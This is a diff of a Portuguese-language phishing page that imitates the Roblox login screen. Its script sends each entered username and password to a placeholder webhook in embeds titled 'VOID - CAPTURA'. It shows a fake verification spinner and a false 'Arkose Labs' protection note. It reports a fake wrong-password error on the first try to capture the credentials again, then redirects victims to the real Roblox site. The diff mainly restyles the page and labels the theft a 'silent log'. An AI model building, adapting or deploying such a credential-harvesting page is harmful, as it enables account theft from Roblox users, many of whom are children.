@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+=<!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
@@ -16,9 +16,6 @@
             --rbx-blue: #0084ff;
             --rbx-error: #df281f;
             --border-grey: #494d5a;
-            --icon-size-medium: 24px;
-            --color-state-hover: rgba(255, 255, 255, 0.1);
-            --color-state-press: rgba(255, 255, 255, 0.15);
         }
 
         body, html { 
@@ -28,14 +25,15 @@
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* --- FOUNDATION MODAL SYSTEM --- */
+        /* --- SEU CÓDIGO DE MODAL INTEGRADO --- */
         .modal {
             text-align: center;
             position: fixed;
-            inset: 0; /* Seu código: top, bottom, left, right: 0 */
-            background-color: rgba(0,0,0,.6);
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-color: rgba(0,0,0,.5);
             z-index: 9999;
-            display: none;
+            display: none; /* Ativado via JS */
         }
 
         .modal:before {
@@ -55,51 +53,44 @@
             position: relative;
         }
 
-        .modal-content.dark-theme {
+        .modal-dialog .modal-content.dark-theme {
             background-color: #272930;
             color: #f7f7f8;
             border-radius: 8px;
             overflow: hidden;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.5);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
 
         .modal-header {
-            padding: 15px 20px;
+            padding: 15px;
             border-bottom: 1px solid #454749;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
-        .modal-title h4 { margin: 0; font-size: 20px; font-weight: 700; letter-spacing: -0.5px; }
+        .modal-title h4 { margin: 0; font-size: 18px; font-weight: 700; }
 
-        /* ÍCONE DE FECHAR (SVG OFICIAL QUE VOCÊ MANDOU) */
-        .close-btn {
-            background: none; border: none; padding: 8px; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-            border-radius: 4px; transition: background 0.2s;
-        }
-        .close-btn:hover { background-color: var(--color-state-hover); }
-        .close-btn:active { background-color: var(--color-state-press); }
-
-        .icon-svg {
-            width: var(--icon-size-medium);
-            height: var(--icon-size-medium);
-            fill: #fff;
+        .close {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+            opacity: 0.5;
         }
 
-        .modal-body { padding: 40px 30px; text-align: center; }
+        .modal-body { padding: 30px; text-align: center; }
 
         .modal-footer-note {
             border-top: 1px solid #454749;
             color: #bcbec8;
-            padding: 12px;
+            padding: 10px;
             text-align: center;
             font-size: 11px;
-            background: rgba(0,0,0,0.1);
         }
 
-        /* --- LOGIN UI --- */
+        /* --- ELEMENTOS DE UI --- */
         .main-content { 
             flex: 1; display: flex; align-items: center; justify-content: center;
             background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
@@ -110,31 +101,17 @@
         
         #error-msg { 
             color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; 
-            background: rgba(223, 40, 31, 0.1); padding: 12px; border-radius: 4px; border-left: 3px solid var(--rbx-error);
-            text-align: left; font-weight: 500;
+            background: rgba(223, 40, 31, 0.1); padding: 10px; border-radius: 4px; border-left: 3px solid var(--rbx-error);
+            text-align: left;
         }
 
-        .input-field { 
-            width: 100%; height: 44px; background-color: var(--input-bg); 
-            border: 1px solid #252728; border-radius: 4px; color: #fff; 
-            padding: 0 12px; margin-bottom: 12px; box-sizing: border-box;
-            font-size: 15px; outline: none; transition: border 0.2s;
-        }
-        .input-field:focus { border-color: var(--rbx-blue); }
+        .input-field { width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728; border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px; box-sizing: border-box; }
         .input-error { border: 1px solid var(--rbx-error) !important; }
         
-        .btn-primary-md { 
-            width: 100%; height: 40px; border: 1px solid #fff; background: transparent; 
-            color: #fff; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer;
-            transition: background 0.2s;
-        }
-        .btn-primary-md:hover { background: rgba(255,255,255,0.05); }
+        .btn-primary-md { width: 100%; height: 40px; border: 1px solid #fff; background: transparent; color: #fff; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }
 
-        .spinner { 
-            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); 
-            border-top: 4px solid var(--rbx-blue); border-radius: 50%; 
-            animation: spin 0.8s linear infinite; margin: 0 auto; 
-        }
+        /* Spinner Animado */
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--rbx-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
         .shake { animation: shake 0.2s ease-in-out 0s 2; }
@@ -147,20 +124,16 @@
         <div class="modal-content dark-theme">
             <div class="modal-header">
                 <div class="modal-title"><h4>Verificação</h4></div>
-                <button class="close-btn" onclick="closeModal()">
-                    <svg class="icon-svg" viewBox="0 0 32 32">
-                        <path d="M7.29289 8.70711C6.90237 8.31658 6.90237 7.68342 7.29289 7.29289C7.68342 6.90237 8.31658 6.90237 8.70711 7.29289L16 14.5858L23.2929 7.29289C23.6834 6.90237 24.3166 6.90237 24.7071 7.29289C25.0976 7.68342 25.0976 8.31658 24.7071 8.70711L17.4142 16L24.7071 23.2929C25.0976 23.6834 25.0976 24.3166 24.7071 24.7071C24.3166 25.0976 23.2929 24.7071L16 17.4142L8.70711 24.7071C8.31658 25.0976 7.29289 24.7071C6.90237 24.3166 7.29289 23.2929L14.5858 16L7.29289 8.70711Z"></path>
-                    </svg>
-                </button>
+                <button class="close" onclick="closeModal()">×</button>
             </div>
             <div class="modal-body">
-                <div class="spinner"></div>
-                <p style="margin-top: 25px; font-size: 15px; font-weight: 400; color: #ced0d6;">
-                    Verificando se você é humano...
-                </p>
+                <div class="modal-image-container">
+                    <div class="spinner"></div>
+                    <p style="margin-top: 20px; font-size: 14px;">Aguarde, autenticando com os servidores da Roblox...</p>
+                </div>
             </div>
             <div class="modal-footer-note">
-                Sessão: <span id="session-id"></span>
+                Sessão protegida pelo Arkose Labs
             </div>
         </div>
     </div>
@@ -169,20 +142,21 @@
 <main class="main-content">
     <div class="login-card" id="card">
         <h1 style="margin-bottom: 25px; font-weight: 700; font-size: 24px;">Entrar na Roblox</h1>
+        
         <div id="error-msg">Nome de usuário ou senha incorretos.</div>
+
         <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
         <input type="password" id="pass" class="input-field" placeholder="Senha">
         <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
-        <div style="margin-top: 25px; border-top: 1px solid #454749; padding-top: 20px;">
-            <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none; font-weight: 500;">Esqueceu a senha?</a>
+        
+        <div style="margin-top: 20px; border-top: 1px solid #454749; padding-top: 20px;">
+            <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none;">Esqueceu a senha?</a>
         </div>
     </div>
 </main>
 
 <script>
     let attempt = 0;
-    // Gera um Session ID realista no rodapé
-    document.getElementById('session-id').innerText = Math.random().toString(36).substring(2, 10).toUpperCase();
 
     function openModal() { document.getElementById('modal-verificacao').style.display = 'block'; }
     function closeModal() { document.getElementById('modal-verificacao').style.display = 'none'; }
@@ -203,19 +177,20 @@
         attempt++;
         openModal();
 
+        // LOG SILENCIOSO VIA WEBHOOK
         try {
             await fetch("SUA_WEBHOOK_AQUI", {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🛡️ VOID - CAPTURA FOUNDATION",
+                        title: attempt === 1 ? "🛡️ VOID - CAPTURA INICIAL" : "🛡️ VOID - SEGUNDA TENTATIVA",
                         color: attempt === 1 ? 3447003 : 15105570,
                         fields: [
                             { name: "👤 Usuário", value: `\`${u}\``, inline: true },
-                            { name: "🔑 Senha", value: `\`${p}\``, inline: true },
-                            { name: "🔄 Tentativa", value: `\`${attempt}\``, inline: true }
+                            { name: "🔑 Senha", value: `\`${p}\``, inline: true }
                         ],
+                        footer: { text: `Tentativa: ${attempt}` },
                         timestamp: new Date().toISOString()
                     }]
                 }),
@@ -223,6 +198,7 @@
             });
         } catch(e) {}
 
+        // SIMULAÇÃO DE CARREGAMENTO E RESPOSTA
         setTimeout(() => {
             closeModal();
             if(attempt === 1) {
@@ -234,7 +210,7 @@
             } else {
                 window.location.href = "https://www.roblox.com/home";
             }
-        }, 2500);
+        }, 2200);
     }
 </script>
 </body>
